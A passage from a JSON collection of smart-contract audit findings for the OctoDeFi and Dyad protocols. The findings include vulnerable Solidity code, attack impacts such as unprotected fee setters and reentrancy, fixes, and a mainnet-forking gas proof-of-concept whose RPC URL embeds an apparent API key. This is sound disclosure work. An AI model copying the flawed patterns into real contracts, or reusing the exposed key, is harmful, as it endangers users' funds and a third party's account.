USD\n   ```\n\n2. **Likewise in `calculateTokenAmount()`**\n   ```solidity\n   uint8 decimals = IERC20Metadata(token).decimals();\n   uint256 scale = 10 ** decimals;\n   return feeInUSD * scale / tokenPrice;\n   ```\n\n**OctoDeFi:** Fixed in PR [\\#13](https://github.com/octodefi/strategy-builder-plugin/pull/13).\n\n**Cyfrin:** To normalize the fee in USD to the oracle decimals (18), the token decimals should be divided out in both instances. Also consider using a `staticcall` to query the token decimals and fall back to 18 if it fails.\n\n**OctoDeFi:** Fixed in PR [\\#27](https://github.com/octodefi/strategy-builder-plugin/pull/27).\n\n**Cyfrin:** Verified. The fee amount is first normalized to 18 decimals and then divided by the oracle decimals. While this is a little more convoluted than necessary given that the oracle price is in 18 already decimals, given that the fee calculation could have simply been divided by the token decimals instead of oracle decimals without first normalizing the fee to 18 decimals, it is now correct.",
      "summary": "\nThe bug report discusses an issue with the `FeeController.calculateFee()` and `calculateTokenAmount()` functions, which treat every ERC-20 token as if it has 18 decimals. However, this is not the case for many popular tokens such as USDC and USDT, which have 6 decimals. This leads to incorrect fee calculations when mixing tokens with different decimal places. The recommended solution is to use the `decimals()` function to get the token's actual number of decimals and use that in the calculations. The bug has been fixed in the latest pull request.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Octodefi",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-07-17-cyfrin-octodefi-v2.0.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Giovanni Di Siena",
        "Farouk"
      ]
    },
    {
      "id": "61597",
      "title": "Missing access control on critical `FeeController` setters",
      "impact": "HIGH",
      "content": "**Description:** `FeeController.setFunctionFeeConfig()`, `setTokenGetter()`, and `setGlobalTokenGetter()` are declared `external` but have **no modifier** restricting the caller. Any account can freely (re)configure fee percentages, token-getter addresses, or even swap in malicious contracts.\n\n```solidity\n/// @inheritdoc IFeeController\nfunction setFunctionFeeConfig(bytes4 _selector, FeeType _feeType, uint256 _feePercentage) external {\n    if (_feePercentage > maxFeeLimits[_feeType]) {\n        revert FeePercentageExceedLimit();\n    }\n\n    functionFeeConfigs[_selector] = FeeConfig(_feeType, _feePercentage);\n\n    emit FeeConfigSet(_selector, _feeType, _feePercentage);\n}\n\n/// @inheritdoc IFeeController\nfunction setTokenGetter(bytes4 _selector, address _tokenGetter, address _target) external {\n    if (_target == address(0) || _tokenGetter == address(0)) {\n        revert ZeroAddressNotValid();\n    }\n\n    tokenGetters[_target][_selector] = _tokenGetter;\n    emit TokenGetterSet(_target, _selector, _tokenGetter);\n}\n\n/// @inheritdoc IFeeController\nfunction setGlobalTokenGetter(bytes4 _selector, address _tokenGetter) external {\n    if (_tokenGetter == address(0)) {\n        revert ZeroAddressNotValid();\n    }\n\n    globalTokenGetters[_selector] = _tokenGetter;\n    emit GlobalTokenGetterSet(_selector, _tokenGetter);\n}\n```\n\n**Impact:** Attackers can:\n* Set the fee percentage to 0 and drain executors' revenue, or maximize it to grief smart accounts using the plugin.\n* Cause DoS by setting the `tokenGetters` and `globalTokenGetters` to a contract that reverts on all calls\n\n\n**Recommended Mitigation:** Add `onlyOwner` modifier to all state-changing admin setters inside `FeeController`.\n\n**OctoDeFi:** Fixed in PR [\\#12](https://github.com/octodefi/strategy-builder-plugin/pull/12).\n\n**Cyfrin:** Verified. The `onlyOwner` modifier has been applied to the `setFunctionFeeConfig()`, `setTokenGetter()`, and `setGlobalTokenGetter()` functions.\n\n\\clearpage",
      "summary": "\nThis bug report discusses an issue with the `FeeController` contract in the `strategy-builder-plugin` project. The functions `setFunctionFeeConfig()`, `setTokenGetter()`, and `setGlobalTokenGetter()` are declared as `external` but do not have any modifier restricting who can call them. This means that any account can change the fee percentages, token-getter addresses, or even swap in malicious contracts. This could lead to attackers draining revenue or causing a denial of service attack. The recommended solution is to add an `onlyOwner` modifier to these functions. The bug has been fixed in the latest version of the project. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Octodefi",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-07-17-cyfrin-octodefi-v2.0.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Giovanni Di Siena",
        "Farouk"
      ]
    },
    {
      "id": "41700",
      "title": "[L-04] The unstake() function can be re-entered",
      "impact": "LOW",
      "content": "Here is the order of operations:\n\n```solidity\n_claimRewards(noteId, stakeInfo, recipient);\n\npositionManager.safeTransferFrom(address(this), msg.sender, stakeInfo.tokenId);\n\ndelete stakes[noteId];\n```\n\n`safeTransferFrom()` will call the `onERC721Received()` function on `msg.sender` if `msg.sender` is a contract.\nAt this point, since `stakes[noteId]` has not yet been deleted, the user can transfer the NFT back to the `UniswapV3Staking` contract, and then re-enter `unstake()` once again and it will not revert.\n\nSince `_claimRewards()` updates `stakeInfo.lastRewardTime` to `block.timestamp`, the rewards earned upon reentrancy will be `0`, so the reentrancy does not cause any fund loss. However, it is risky because any future changes to the reward calculation can potentially lead to a critical vulnerability where an attacker re-enters unstake() to drain the rewards.\n\nCurrently the only impact is that the `Unstaked` event can be spammed an unlimited amount of times via this reentrancy.\n\nThe recomendation is to change the order of operations as follows:\n\n```diff\n_claimRewards(noteId, stakeInfo, recipient);\n\n-positionManager.safeTransferFrom(address(this), msg.sender, stakeInfo.tokenId);\n\ndelete stakes[noteId];\n\n+positionManager.safeTransferFrom(address(this), msg.sender, stakeInfo.tokenId);\n\n```",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "Dyad",
      "source_link": "https://github.com/pashov/audits/blob/master/team/md/Dyad-security-review.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "41699",
      "title": "[L-03] Unused `isDNftOwner` can be removed",
      "impact": "LOW",
      "content": "Since the `isDNftOwner` modifier has been replaced with the `_authorizeCall` check. This modifier can be removed as it is unused.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "Dyad",
      "source_link": "https://github.com/pashov/audits/blob/master/team/md/Dyad-security-review.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "41698",
      "title": "[L-02] DOS of user operations if totalXP is below 10",
      "impact": "LOW",
      "content": "`_computeXP` calculates accrual rate modifier as `1e18/log10(totalXP)` if totalXP is greater than 0. The issue is that base10 log of any number less than 10 ranges from undefined, 0, to \"0.decimals\" which in solidity is eventually rounded down to 0. As a result, attempts to calculate `accrualRateModifier` will revert to dossing `_computeXP`.\n\n```solidity\n    function _computeXP(NoteXPData memory lastUpdate) internal view returns (uint256) {\n        uint256 elapsed = block.timestamp - lastUpdate.lastAction;\n        uint256 deposited = lastUpdate.keroseneDeposited;\n        uint256 dyadMinted = lastUpdate.dyadMinted;\n        uint256 totalXP = lastUpdate.totalXP;\n\n        uint256 accrualRateModifier = totalXP > 0 ? 1e18 / totalXP.log10() : 1e18; //@note\n\n        uint256 adjustedAccrualRate = accrualRateModifier * 1e7;//@note\n//...\n```\n\nAs can be seen from the codebase, `_computeXP` is extensively in `updateXP` (called when dyad is minted/burned in the vaultmanager, tokens are deposited into the kerosene vaults, and when they are liquidated), `beforeKeroseneWithdrawn` (called when tokens are withdrawn from the kerosene vaults) and other instances of querying DyadXPv2 information.\n\nThe probability of this occurring is a bit low though as it requires a low amount of totalXP accumulated after kerosine withdrawal.\n\nRecommend ensuring that totalXP is never below 10. The check can be refactored to > 100, since the log of values 10 - 99 is 1, and 1e18/1 is still 1e18\n\n```diff\n    function _computeXP(NoteXPData memory lastUpdate) internal view returns (uint256) {\n        uint256 elapsed = block.timestamp - lastUpdate.lastAction;\n        uint256 deposited = lastUpdate.keroseneDeposited;\n        uint256 dyadMinted = lastUpdate.dyadMinted;\n        uint256 totalXP = lastUpdate.totalXP;\n\n-       uint256 accrualRateModifier = totalXP > 0 ? 1e18 / totalXP.log10() : 1e18;\n+       uint256 accrualRateModifier = totalXP > 99 ? 1e18 / totalXP.log10() : 1e18;\n\n        uint256 adjustedAccrualRate = accrualRateModifier * 1e7;\n//...\n```",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "Dyad",
      "source_link": "https://github.com/pashov/audits/blob/master/team/md/Dyad-security-review.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "41697",
      "title": "[L-01] Owner is ignored during initialization",
      "impact": "LOW",
      "content": "In `DyadXPv2` and `UniswapV3Staking` the `initialize` function has an `owner` argument; However, this argument is ignored during the ownable initialization, as the `msg.sender` is set as the owner instead:\n\n```solidity\n    function initialize(\n->      address _owner,  //@audit ignored\n        IERC20 _rewardsToken,\n        INonfungiblePositionManager _positionManager,\n        IDyadXP _dyadXP,\n        DNft _dnft,\n        uint256 _rewardsRate,\n        address _rewardsTokenHolder\n    ) public initializer {\n        __UUPSUpgradeable_init();\n->      __Ownable_init(msg.sender);\n\n        rewardsToken = _rewardsToken;\n        positionManager = _positionManager;\n        dyadXP = _dyadXP;\n        dnft = _dnft;\n        rewardsRate = _rewardsRate;\n        rewardsTokenHolder = _rewardsTokenHolder;\n    }\n```\n\nThis might result in the wrong owner being set when `msg.sender` differs from `_owner`. Either remove the `owner` argument from `initialize`, or pass it to `__Ownable_init`.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "Dyad",
      "source_link": "https://github.com/pashov/audits/blob/master/team/md/Dyad-security-review.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "41696",
      "title": "[M-03] Liquidated users are wrongly protected from slashing due to incorrect XP update",
      "impact": "MEDIUM",
      "content": "## Severity\n\n**Impact:** Medium\n\n**Likelihood:** Medium\n\n## Description\n\nOn a base level, liquidating a vault functions as both a `withdraw` and `deposit` function and upon withdrawing from a kerosene vault, the note's xp is slashed. However, during liquidations, this is not done for the liquidated note, as `updateXP` is used instead, rather than the `beforeKeroseneWithdrawn`. As a result, the note xp is not affected even during the pseudowithdrawal.\n\n```solidity\n                vault.move(id, to, asset);\n                if (address(vault) == KEROSENE_VAULT) {\n                    dyadXP.updateXP(id);\n                    dyadXP.updateXP(to);\n                }\n            }\n```\n\n## Recommendations\n\nFixing this might need a bit of refactoring. Something like below will work.\n\n```diff\n                vaultAmounts[i] = asset;\n\n-                vault.move(id, to, asset);\n-                if (address(vault) == KEROSENE_VAULT) {\n-                    dyadXP.updateXP(id);\n-                    dyadXP.updateXP(to);\n-                }\n-            }\n+              if (address(vault) == KEROSENE_VAULT) {\n+                   dyadXP.beforeKeroseneWithdrawn(id);\n+                   vault.move(id, to, asset);//This subtracts from id first and adds to to\n+                   dyadXP.updateXP(to);\n+               } else {\n+               vault.move(id, to, asset);\n+           }\n```",
      "summary": "\nThe report describes a bug that occurs when liquidating a vault. Liquidating a vault is supposed to act as both a withdrawal and deposit function, but when withdrawing from a kerosene vault, the note's xp is not affected. This is because the code uses the `updateXP` function instead of the `beforeKeroseneWithdrawn` function. The report recommends fixing this by refactoring the code to use the `beforeKeroseneWithdrawn` function before the `updateXP` function.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "Dyad",
      "source_link": "https://github.com/pashov/audits/blob/master/team/md/Dyad-security-review.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "41695",
      "title": "[M-02] Reward time is updated even when no rewards are sent",
      "impact": "MEDIUM",
      "content": "## Severity\n\n**Impact:** Medium\n\n**Likelihood:** Medium\n\n## Description\n\nIn `UniswapV3Staking` users can claim rewards by calling the `claimRewards` function. However, the `lastRewardTime` is always updated even when they get zero rewards:\n\n```solidity\n    function _claimRewards(uint256 noteId, StakeInfo storage stakeInfo, address recipient) internal {\n        require(dnft.ownerOf(noteId) == msg.sender, \"You are not the Note owner\");\n        require(stakeInfo.isStaked, \"Note not staked\");\n        uint256 rewards = _calculateRewards(noteId, stakeInfo);\n->      stakeInfo.lastRewardTime = block.timestamp;\n\n        if (rewards > 0) {\n            rewardsToken.transferFrom(rewardsTokenHolder, recipient, rewards);\n            emit RewardClaimed(recipient, rewards);\n        }\n    }\n```\n\nSuppose the scenario where rewards are temporarily disabled by setting `rewardsRate` to zero. Then, any user that calls `claimRewards` during this period will update their `lastRewardTime` even if they don't get anything back. The next time, they will receive fewer rewards after they are enabled again.\n\n## Recommendations\n\nConsider applying the following change:\n\n```diff\n    function _claimRewards(uint256 noteId, StakeInfo storage stakeInfo, address recipient) internal {\n        require(dnft.ownerOf(noteId) == msg.sender, \"You are not the Note owner\");\n        require(stakeInfo.isStaked, \"Note not staked\");\n        uint256 rewards = _calculateRewards(noteId, stakeInfo);\n-       stakeInfo.lastRewardTime = block.timestamp;\n\n        if (rewards > 0) {\n+           stakeInfo.lastRewardTime = block.timestamp;\n            rewardsToken.transferFrom(rewardsTokenHolder, recipient, rewards);\n            emit RewardClaimed(recipient, rewards);\n        }\n    }\n```",
      "summary": "\nThis bug report is about the `UniswapV3Staking` function which allows users to claim rewards. The issue is that even when users receive zero rewards, the `lastRewardTime` is still updated. This can cause problems when rewards are temporarily disabled and then re-enabled, as users will receive fewer rewards. The report suggests a change to the code to fix this issue.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "Dyad",
      "source_link": "https://github.com/pashov/audits/blob/master/team/md/Dyad-security-review.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "41694",
      "title": "[M-01] Users will miss some rewards when they add liquidity",
      "impact": "MEDIUM",
      "content": "## Severity\n\n**Impact:** Medium\n\n**Likelihood:** Medium\n\n## Description\n\nIn `UniswapV3Staking.stake`, the current liquidity is stored when a note is staked:\n\n```solidity\n    function stake(uint256 noteId, uint256 tokenId) external {\n        require(dnft.ownerOf(noteId) == msg.sender, \"You are not the Note owner\");\n\n        StakeInfo storage stakeInfo = stakes[noteId];\n        require(!stakeInfo.isStaked, \"Note already used for staking\");\n\n        (,,,,,,, uint128 liquidity,,,,) = positionManager.positions(tokenId);\n        require(liquidity > 0, \"No liquidity\");\n\n        positionManager.safeTransferFrom(msg.sender, address(this), tokenId);\n\n        stakes[noteId] = StakeInfo({\n->        liquidity: liquidity,\n          lastRewardTime: block.timestamp,\n          tokenId: tokenId,\n          isStaked: true\n        });\n\n        emit Staked(msg.sender, noteId, tokenId, liquidity);\n    }\n```\n\nThis value will be used when they claim their rewards:\n\n```solidity\n    function _calculateRewards(uint256 noteId, StakeInfo storage stakeInfo) internal view returns (uint256) {\n        uint256 timeDiff = block.timestamp - stakeInfo.lastRewardTime;\n\n        uint256 xp = dyadXP.balanceOfNote(noteId);\n\n->      return timeDiff * rewardsRate * stakeInfo.liquidity * xp;\n    }\n```\n\nHowever, if a user keeps adding liquidity to their own position with `NonfungiblePositionManager.increaseLiquidity`, the liquidity will be stale, so they will receive fewer rewards than intended as it will use the original value (when they staked it).\n\n## Recommendations\n\nConsider using the up-to-date liquidity instead of storing it:\n\n```diff\n    function _calculateRewards(uint256 noteId, StakeInfo storage stakeInfo) internal view returns (uint256) {\n        uint256 timeDiff = block.timestamp - stakeInfo.lastRewardTime;\n\n        uint256 xp = dyadXP.balanceOfNote(noteId);\n\n-       return timeDiff * rewardsRate * stakeInfo.liquidity * xp;\n+       (,,,,,,, uint128 liquidity,,,,) = positionManager.positions(stakeInfo.tokenId);\n+       return timeDiff * rewardsRate * liquidity * xp;\n    }\n```",
      "summary": "\nThe report is about a bug in the UniswapV3Staking contract, which stores the current liquidity when a user stakes their note. This value is then used to calculate rewards when the user claims them. However, if the user keeps adding liquidity to their position, the stored liquidity becomes stale and they receive fewer rewards than intended. The recommendation is to use the up-to-date liquidity instead of storing it to avoid this issue.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "Dyad",
      "source_link": "https://github.com/pashov/audits/blob/master/team/md/Dyad-security-review.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "41693",
      "title": "[H-06] Staking rewards should be claimed before each `balanceOfNote` changing",
      "impact": "HIGH",
      "content": "## Severity\n\n**Impact:** Medium\n\n**Likelihood:** High\n\n## Description\n\nSince staking rewards depend on `balanceOfNote` the `claimRewards` function should be invoked on each `balanceOfNote` changing. But this functionality is not implemented. This way reward can be calculated incorrectly which can cause sufficient asset losses.\n\n```solidity\n    function _calculateRewards(uint256 noteId, StakeInfo storage stakeInfo) internal view returns (uint256) {\n        uint256 timeDiff = block.timestamp - stakeInfo.lastRewardTime;\n\n>>      uint256 xp = dyadXP.balanceOfNote(noteId);\n\n>>      return timeDiff * rewardsRate * stakeInfo.liquidity * xp;\n    }\n```\n\n## Recommendations\n\nConsider claiming rewards for notes with `stakes[noteId].isStaked == true` before any `balanceOfNote` changing: `deposit`, `withdraw`, `mintDyad`, `burnDyad`, `liquidate` (for both `id` and `to` notes).",
      "summary": "\nThis bug report is about a medium severity bug that has a high likelihood of occurring. The `claimRewards` function is not being invoked when the `balanceOfNote` changes, which can lead to incorrect calculations and cause losses in assets. The recommendation is to claim rewards for notes with `stakes[noteId].isStaked == true` before any changes are made to the `balanceOfNote`. This should be done before any of the following functions are called: `deposit`, `withdraw`, `mintDyad`, `burnDyad`, `liquidate` (for both `id` and `to` notes).",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "Dyad",
      "source_link": "https://github.com/pashov/audits/blob/master/team/md/Dyad-security-review.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "41692",
      "title": "[H-05] Users cannot stake in `UniV3Staking`",
      "impact": "HIGH",
      "content": "## Severity\n\n**Impact:** Medium\n\n**Likelihood:** High\n\n## Description\n\n`UniswapV3Staking.stake()` pulls NFTs from the user in the following way:\n\n```solidity\n        positionManager.safeTransferFrom(msg.sender, address(this), tokenId);\n```\n\nHowever, this will end up calling the `onERC721Received()` function on the `UniswapV3Staking` contract, and expect a return value. However since that function is not implemented in this contract, the ERC721 transfer will fail, reverting the execution of `stake()`.\n\n## Recommendations\n\nImplement the following function to ensure that ERC721's can be received via `safeTransferFrom()`:\n\n```solidity\nfunction onERC721Received(address, address, uint256, bytes calldata) public pure returns (bytes4) {\n        return msg.sig;\n}\n```",
      "summary": "\nThis bug report discusses an issue with the `UniswapV3Staking.stake()` function, which is used to pull NFTs from users. The problem is that the function calls a non-existent function, `onERC721Received()`, which causes the transfer to fail and the execution of `stake()` to revert. To fix this issue, the report recommends implementing the `onERC721Received()` function in the contract.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "Dyad",
      "source_link": "https://github.com/pashov/audits/blob/master/team/md/Dyad-security-review.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "41691",
      "title": "[H-04] Initialization of DyadXPv2 is impossible",
      "impact": "HIGH",
      "content": "## Severity\n\n**Impact:** Medium\n\n**Likelihood:** High\n\n## Description\n\n`DyadXPv2.initialize()` loops across the supply of `DNFT`:\n\n```solidity\nfor (uint256 i = 0; i < dnftSupply; ++i) {\n            noteData[i] = NoteXPData({\n                lastAction: uint40(block.timestamp),\n                keroseneDeposited: uint96(KEROSENE_VAULT.id2asset(i)),\n                lastXP: noteData[i].lastXP,\n                totalXP: noteData[i].lastXP,\n                dyadMinted: DYAD.mintedDyad(i)\n            });\n        }\n```\n\nThe current total supply of `DNFT` is 882.\n\ngas used in 88 iterations is 3.130682e6\n\nThis means that the total cost of the loop is at least 3.130682e7, which exceeds the 3e7 (30M) gas limit.\n\n**Proof of Concept**\n\nDue to foundry limitations, it's not possible to run the PoC across all 882 iterations.\n\nTo calculate the gas used for 88 (10% of total) iterations, make the following change in `DyadXPv2.initialize()`:\n\n```diff\n\n            noteData[i] = NoteXPData({\n                lastAction: uint40(block.timestamp),\n                keroseneDeposited: uint96(KEROSENE_VAULT.id2asset(i)),\n                lastXP: noteData[i].lastXP,\n                totalXP: noteData[i].lastXP,\n                dyadMinted: DYAD.mintedDyad(i)\n            });\n\n+         if (i == dnftSupply / 10 - 1) {\n+              console.log(\"gas used in %s iterations is %e\", i+1, gas - gasleft());\n+               return;\n+           }\n```\n\nThen add this PoC file to `test/` and run `test_InitCost`:\n\n**Coded PoC**\n\n```solidity\nimport {Test, console} from \"forge-std/Test.sol\";\nimport {DyadXPv2} from \"../../src/staking/DyadXPv2.sol\";\n\nimport {Kerosine} from \"../../src/staking/Kerosine.sol\";\nimport {DNft} from \"../../src/core/DNft.sol\";\nimport {KeroseneVault} from \"../../src/core/VaultKerosene.sol\";\nimport {Dyad} from \"../../src/core/Dyad.sol\";\nimport {UUPSUpgradeable} from \"@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol\";\n\ncontract StakingTest is Test {\n    address VAULT_MANAGER = 0xB62bdb1A6AC97A9B70957DD35357311e8859f0d7;\n    address dNFT_owner = 0xDeD796De6a14E255487191963dEe436c45995813;\n\n    DyadXPv2 dyadXP_v2;\n\n    Kerosine kerosine;\n    DNft dnft;\n    Dyad dyad;\n    KeroseneVault keroseneVault;\n\n    function setUp() external {\n        string memory RPC_URL = \"https://eth-mainnet.g.alchemy.com/v2/vDqr_aMYwqkkAUs-sM3S07j92pkny3yE\";\n        vm.createSelectFork(RPC_URL);\n\n        dyad = Dyad(0xFd03723a9A3AbE0562451496a9a394D2C4bad4ab);\n        dnft = DNft(0xDc400bBe0B8B79C07A962EA99a642F5819e3b712);\n        kerosine = Kerosine(0xf3768D6e78E65FC64b8F12ffc824452130BD5394);\n        keroseneVault = KeroseneVault(0x4808e4CC6a2Ba764778A0351E1Be198494aF0b43);\n    }\n\n    function test_InitCost() public {\n        // Deploy DyadXPv2 implementation\n        DyadXPv2 impl = new DyadXPv2(\n            VAULT_MANAGER,\n            address(keroseneVault),\n            address(dnft),\n            address(dyad)\n        );\n\n        address xp_owner = 0xDeD796De6a14E255487191963dEe436c45995813;\n\n        // Upgrade DyadXP->DyadXPv2\n        vm.prank(xp_owner);\n        UUPSUpgradeable xp_proxy = UUPSUpgradeable(payable(0xeF443646E52d1C28bd757F570D18F4Db30dB70F4));\n        xp_proxy.upgradeToAndCall(address(impl), abi.encodeWithSignature(\"initialize(address)\", address(this)));\n        dyadXP_v2 = DyadXPv2(address(xp_proxy));\n    }\n}\n```\n\n**Console output:**\n\n```bash\nRan 1 test for test/CantInit.t.sol:StakingTest\n[PASS] test_InitCost() (gas: 4767974)\nLogs:\n  gas used in 89 iterations is 3.18022e6\n```\n\n## Recommendations\n\nConsider not looping across the entire dnftSupply on initialization.",
      "summary": "\nThe bug report is about a loop in the `DyadXPv2.initialize()` function that is causing a high gas cost. The function loops through the supply of `DNFT` (a type of cryptocurrency) and calculates the gas cost for each iteration. The current total supply of `DNFT` is 882, which means the loop is using more than 30 million gas, which is the gas limit. The report suggests making changes to the code to reduce the gas cost, as it is not possible to run the code for all 882 iterations due to limitations. The report also includes a Proof of Concept (PoC) file that can be used to test the gas cost for a smaller number of iterations. The report recommends considering not looping through the entire supply of `DNFT` on initialization to reduce the gas cost. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "Dyad",
      "source_link": "https://github.com/pashov/audits/blob/master/team/md/Dyad-security-review.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "41690",
      "title": "[H-03] `updateXP` can be omitted during liquidation",
      "impact": "HIGH",
      "content": "## Severity\n\n**Impact:** Medium\n\n**Likelihood:** High\n\n## Description\n\nThough the `liquidate` function invokes `dyad.burn` the `updateXP` can be omitted in case the liquidated note has no `KEROSENE_VAULT` or `depositAmount == 0`. This way liquidated note's `balanceOfNote` will be incorrect.\n\n```solidity\n    function liquidate(uint256 id, uint256 to, uint256 amount)\n        external\n        isValidDNft(id)\n        isValidDNft(to)\n        returns (address[] memory, uint256[] memory)\n    {\n        uint256 cr = collatRatio(id);\n        if (cr >= MIN_COLLAT_RATIO) revert CrTooHigh();\n        uint256 debt = dyad.mintedDyad(id);\n>>      dyad.burn(id, msg.sender, amount); // changes `debt` and `cr`\n\n        lastDeposit[to] = block.number; // `move` acts like a deposit\n\n        uint256 numberOfVaults = vaults[id].length();\n        address[] memory vaultAddresses = new address[](numberOfVaults);\n        uint256[] memory vaultAmounts = new uint256[](numberOfVaults);\n\n        uint256 totalValue = getTotalValue(id);\n        if (totalValue == 0) return (vaultAddresses, vaultAmounts);\n\n        for (uint256 i = 0; i < numberOfVaults; i++) {\n            Vault vault = Vault(vaults[id].at(i));\n            vaultAddresses[i] = address(vault);\n            if (vaultLicenser.isLicensed(address(vault))) {\n                uint256 depositAmount = vault.id2asset(id);\n>>              if (depositAmount == 0) continue;\n                uint256 value = vault.getUsdValue(id);\n                uint256 asset;\n                if (cr < LIQUIDATION_REWARD + 1e18 && debt != amount) {\n                    uint256 cappedCr = cr < 1e18 ? 1e18 : cr;\n                    uint256 liquidationEquityShare = (cappedCr - 1e18).mulWadDown(LIQUIDATION_REWARD);\n                    uint256 liquidationAssetShare = (liquidationEquityShare + 1e18).divWadDown(cappedCr);\n                    uint256 allAsset = depositAmount.mulWadUp(liquidationAssetShare);\n                    asset = allAsset.mulWadDown(amount).divWadDown(debt);\n                } else {\n                    uint256 share = value.divWadDown(totalValue);\n                    uint256 amountShare = share.mulWadUp(amount);\n                    uint256 reward_rate = amount.divWadDown(debt).mulWadDown(LIQUIDATION_REWARD);\n                    uint256 valueToMove = amountShare + amountShare.mulWadUp(reward_rate);\n                    uint256 cappedValue = valueToMove > value ? value : valueToMove;\n                    asset = cappedValue * (10 ** (vault.oracle().decimals() + vault.asset().decimals()))\n                        / vault.assetPrice() / 1e18;\n                }\n                vaultAmounts[i] = asset;\n\n                vault.move(id, to, asset);\n>>              if (address(vault) == KEROSENE_VAULT) {\n                    dyadXP.updateXP(id);\n                    dyadXP.updateXP(to);\n                }\n            }\n        }\n\n        emit Liquidate(id, msg.sender, to, amount);\n\n        return (vaultAddresses, vaultAmounts);\n    }\n```\n\n## Recommendations\n\nConsider updating XP of the liquidated note after the debt changes.",
      "summary": "\nThis bug report discusses an issue with the `liquidate` function in a smart contract. The severity of the bug is considered medium and the likelihood of it occurring is high. The issue is that the function may omit the `updateXP` step if the liquidated note has no `KEROSENE_VAULT` or if the deposit amount is equal to zero. This can result in an incorrect balance for the liquidated note. The report recommends updating the XP of the note after the debt changes to prevent this issue.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Pashov Audit Group",
      "protocol_name": "Dyad",
      "source_link": "https://github.com/pashov/audits/blob/master/team/md/Dyad-security-review.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Pashov Audit Group"
      ]
    },
    {
      "id": "41689",
      "title": "[H-02] `totalXP` is wrongly calculated for existing users",
      "impact": "HIGH",
      "content": "## Severity\n\n**Impact:** Medium\n\n**Likelihood:** High\n\n## Description\n\nIn `src/staking/DyadXPv2.sol`, the contract must be initialized through the `initialize` function, and the `totalXP` of each user is also calculated here:\n\n```solidity\n    function initialize(address owner) public reinitializer(2) {\n        __UUPSUpgradeable_init();\n        __Ownable_init(msg.sender);\n\n        uint256 dnftSupply = DNFT.totalSupply();\n\n        for (uint256 i = 0; i < dnftSupply; ++i) {\n            noteData[i] = NoteXPData({\n                lastAction: uint40(block.timestamp),\n                keroseneDeposited: uint96(KEROSENE_VAULT.id2asset(i)),\n                lastXP: noteData[i].lastXP,\n->              totalXP: noteData[i].lastXP,\n                dyadMinted: DYAD.mintedDyad(i)\n            });\n        }\n    }\n\n```\n\nHowever, the `totalXP` doesn't consider the last accrued bonus, as it is only the `lastXP` rather than the actual total (including the bonus) during the upgrade.\n\nThis is because the `elapsed` time between the upgrade and their last action is very likely to not be zero:\n\n```solidity\n    function _computeXP(NoteXPData memory lastUpdate) internal view returns (uint256) {\n->      uint256 elapsed = block.timestamp - lastUpdate.lastAction;\n        uint256 deposited = lastUpdate.keroseneDeposited;\n        uint256 dyadMinted = lastUpdate.dyadMinted;\n        uint256 totalXP = lastUpdate.totalXP;\n\n        uint256 accrualRateModifier = totalXP > 0 ? 1e18 / totalXP.log10() : 1e18;\n\n        uint256 adjustedAccrualRate = accrualRateModifier * 1e7;\n\n        // bonus = deposited + deposited * (dyadMinted / (dyadMinted + deposited))\n        uint256 bonus = deposited;\n\n        if (dyadMinted + deposited != 0) {\n            bonus += deposited.mulWadDown(dyadMinted.divWadDown(dyadMinted + deposited));\n        }\n\n        return uint256(lastUpdate.lastXP + (elapsed * adjustedAccrualRate * bonus) / 1e18);\n    }\n```\n\nA numerical example:\n\n```\nlastXP: 1e18\n\n_computeXP:\n\nelapsed: 10_000\ndeposited: 1e18\ndyadMinted: 0\ntotalXP: 0\n\naccrualRateModifier: 1e18\n\nadjustedAccrualRate: 1e18 * 1e7 = 1e25\n\nbonus: 1e18\n\n0 + 1e18 != 0\n    bonus = 1e18 + (1e18 * (0 / (0 + 1e18)) = 1e18\n\n-> 1e18 + (10_000 * 1e25 